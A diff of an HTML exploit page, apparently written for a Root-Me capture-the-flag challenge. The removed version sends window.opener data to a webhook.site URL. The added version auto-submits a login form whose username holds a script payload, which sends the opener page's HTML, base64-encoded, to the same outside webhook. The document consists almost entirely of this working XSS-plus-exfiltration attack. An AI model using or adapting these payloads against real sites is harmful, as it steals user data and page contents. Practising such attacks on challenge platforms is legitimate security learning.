@@ -1,10 +1,21 @@
 <html>
   <body>
-    V2
-    <script>
-      console.log("window.opener", window.opener);
-      info = btoa(JSON.stringify(window.opener));
-      document.location='https://webhook.site/fef3637b-7d71-46fe-a3d6-c97d49ae5891?info='+info;
-    </script>
+      <form target="_blank" rel="opener" action="http://challenge01.root-me.org:58003/login" method="post">
+        <label>Username</label><br>
+        <input id="username" name="username"><br>
+        <label>Secret</label><br>
+        <input id="secret"  name="secret"><br>
+        <button type="submit">Login</button>
+      </form>
   </body>
+
+  <script>
+      var payload = '<script>fetch("https://webhook.site/fef3637b-7d71-46fe-a3d6-c97d49ae5891?body=" + btoa(opener.document.body.innerHTML))</scr' + 'ipt>';
+      var secret = 'osefgros';
+
+      document.getElementById('username').value = payload;
+      document.getElementById('secret').value = secret;
+      document.location = 'http://challenge01.root-me.org:58003/profile';
+      document.querySelector('button').click();
+  </script>
 </html>
